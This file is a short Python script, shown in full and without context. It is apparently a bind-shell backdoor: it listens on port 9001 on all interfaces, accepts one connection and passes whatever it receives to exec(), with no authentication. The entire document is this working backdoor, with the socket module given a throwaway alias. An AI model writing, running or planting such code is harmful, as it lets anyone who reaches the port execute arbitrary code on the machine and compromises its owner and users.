import socket as a
s = a.socket()
s.bind(('',9001))
s.listen(1)
(r,z) = s.accept()
exec(r.recv(999))
